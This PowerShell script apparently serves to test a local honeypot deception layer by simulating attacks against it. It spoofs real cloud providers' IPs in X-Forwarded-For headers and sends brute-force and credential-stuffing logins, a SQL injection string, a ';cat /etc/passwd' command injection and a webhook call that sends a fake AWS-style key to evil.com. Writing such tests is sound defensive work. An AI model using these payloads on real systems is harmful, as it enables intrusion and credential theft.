# Simulate diverse attack patterns against HoneyPot+ deception layer
# Uses X-Forwarded-For with realistic public IPs so geo enrichment is production-accurate
param([string]$Base = "http://localhost:8080")

$AttackerIPs = @(
    "185.220.101.45",   # EU (hosting)
    "54.239.28.85",     # US (AWS)
    "142.250.80.46",    # US (Google)
    "91.134.140.114",   # EU (OVH)
    "45.33.32.156",     # US (Linode)
    "203.208.60.1",     # APAC
    "177.54.148.92",    # South America
    "41.203.78.102"     # Africa
)

function Invoke-Honeypot {
    param([string[]]$CurlArgs, [string]$SpoofIp)
    $args = @("-s") + $CurlArgs
    if ($SpoofIp) {
        $args = @("-H", "X-Forwarded-For: $SpoofIp") + $args
    }
    & curl.exe @args | Out-Null
}

Write-Host "=== HoneyPot+ Attack Simulation ===" -ForegroundColor Cyan
Write-Host "Target: $Base"
Write-Host "Spoofing public attacker IPs via X-Forwarded-For (production-style)"
Write-Host ""

Write-Host "[1/8] Browse login page"
Invoke-Honeypot @("$Base/login") $AttackerIPs[0]

Write-Host "[2/8] Brute-force login (5 attempts)"
1..5 | ForEach-Object {
    $body = "{`"email`":`"admin@test.com`",`"password`":`"pass$_`"}"
    $ip = $AttackerIPs[($_ - 1) % $AttackerIPs.Length]
    Invoke-Honeypot @("-X", "POST", "$Base/auth/login", "-H", "Content-Type: application/json", "-d", $body) $ip
}

Write-Host "[3/8] Credential stuffing"
@("user1@test.com","user2@test.com","user3@test.com","user4@test.com","user5@test.com") | ForEach-Object -Begin { $i = 0 } -Process {
    $body = "{`"email`":`"$_`",`"password`":`"password123`"}"
    Invoke-Honeypot @("-X", "POST", "$Base/auth/login", "-H", "Content-Type: application/json", "-d", $body) $AttackerIPs[$i % $AttackerIPs.Length]
    $i++
}

Write-Host "[4/8] SQL injection"
Invoke-Honeypot @("$Base/api/v1/search?q='%20OR%201=1--") $AttackerIPs[2]

Write-Host "[5/8] RCE attempt"
Invoke-Honeypot @("$Base/api/v1/search?q=;cat%20/etc/passwd") $AttackerIPs[3]

Write-Host "[6/8] Scanner fingerprint"
Invoke-Honeypot @("-A", "sqlmap/1.0", "$Base/api/v1/users") $AttackerIPs[4]

Write-Host "[7/8] Cross-service probing"
@("$Base/admin", "$Base/admin/api/keys", "$Base/api/v1/config", "$Base/api/v1/internal/debug") | ForEach-Object -Begin { $i = 0 } -Process {
    Invoke-Honeypot @($_) $AttackerIPs[$i % $AttackerIPs.Length]
    $i++
}
Invoke-Honeypot @("-X", "POST", "$Base/auth/token", "-d", "{}") $AttackerIPs[5]

Write-Host "[8/8] Honeytoken exfil"
Invoke-Honeypot @(
    "-X", "POST", "$Base/api/v1/webhooks",
    "-H", "Content-Type: application/json",
    "-d", '{"url":"https://evil.com","secret":"AKIA4ACME7DEPLOY01"}'
) $AttackerIPs[6]

Write-Host ""
Write-Host "=== Simulation complete ===" -ForegroundColor Green
Write-Host "Check dashboard at http://localhost:9090 - events appear within ~2 seconds."